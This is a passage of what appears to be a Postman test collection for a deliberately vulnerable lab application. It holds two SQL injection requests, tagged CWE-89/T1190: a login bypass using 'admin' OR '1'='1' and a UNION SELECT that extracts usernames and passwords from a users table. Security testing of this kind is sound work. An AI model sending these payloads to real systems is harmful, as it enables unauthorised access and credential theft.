      "name": "01. SQLi Auth Bypass (CWE-89 / T1190)",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"username\": \"admin' OR '1'='1\", \"password\": \"password123\"}"
        },
        "url": {
          "raw": "{{base_url}}/api/proxy/api/v1/vulnerable/auth/login/",
          "host": [
            "{{base_url}}"
          ],
          "path": [
            "api",
            "proxy",
            "api",
            "v1",
            "vulnerable",
            "auth",
            "login",
            ""
          ]
        }
      }
    },
    {
      "name": "02. SQLi UNION Search (CWE-89 / T1190)",
      "request": {
        "method": "GET",
        "header": [],
        "url": {
          "raw": "{{base_url}}/api/proxy/api/v1/vulnerable/books/search/?q=Python' UNION SELECT null,username,password FROM users--",
          "host": [
            "{{base_url}}"
          ],
          "path": [
            "api",
            "proxy",
            "api",
            "v1",
            "vulnerable",
            "books",
            "search",
            ""
          ],
          "query": [
            {
              "key": "q",
              "value": "Python' UNION SELECT null,username,password FROM users--"
            }
          ]
        }
      }
    },
